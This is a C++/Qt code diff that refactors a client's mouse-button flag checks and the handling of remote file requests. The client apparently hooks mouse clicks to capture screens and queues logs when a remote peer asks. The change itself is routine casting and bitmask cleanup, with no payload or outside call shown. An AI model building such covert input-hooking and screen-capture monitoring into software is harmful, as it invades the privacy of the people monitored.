@@ -88,12 +88,10 @@ void Client::update()
     qDebug() << "Screen timer:\t" << config->secondsScreen;
 
     //set flags
-//    std::bitset<to_underlying(Buttons::count)>buttons (config->mouseButtons.toStdString());
-
-    qDebug() << "LMB:\t" << config->mouseButtons.test(to_underlying(Buttons::left));
-    qDebug() << "RMB:\t" << config->mouseButtons.test(to_underlying(Buttons::right));
-    qDebug() << "MMB:\t" << config->mouseButtons.test(to_underlying(Buttons::middle));
-    qDebug() << "MWH:\t" << config->mouseButtons.test(to_underlying(Buttons::wheel));
+    qDebug() << "LMB:\t" << config->mouseButtons.test(int(Buttons::left));
+    qDebug() << "RMB:\t" << config->mouseButtons.test(int(Buttons::right));
+    qDebug() << "MMB:\t" << config->mouseButtons.test(int(Buttons::middle));
+    qDebug() << "MWH:\t" << config->mouseButtons.test(int(Buttons::wheel));
     qDebug() << "Logging is " << (config->logRun ? "on" : "off");
     qDebug() << "Log timer:\t" << config->secondsLog << endl;
 
@@ -137,17 +135,9 @@ void Client::getString(const QString &string, const QString& /* ip */)
         QString currentFile = filesStr.section('|', 0, 0);
         int files = currentFile.toInt();
 
-        switch (files)
-        {
-        case Files::Screen:
-            emit MouseHook::instance().mouseClicked();
-            break;
-        case Files::Log:
-            enqueueLog();
-            break;
-        default:
-            break;
-        }
+        if (files & (int)Files::Screen) emit MouseHook::instance().mouseClicked();
+        if (files & (int)Files::Log) enqueueLog();
+
 /*
         //Look for all files in string
         currentFile = filesStr.section('|', 1, 1, QString::SectionSkipEmpty);
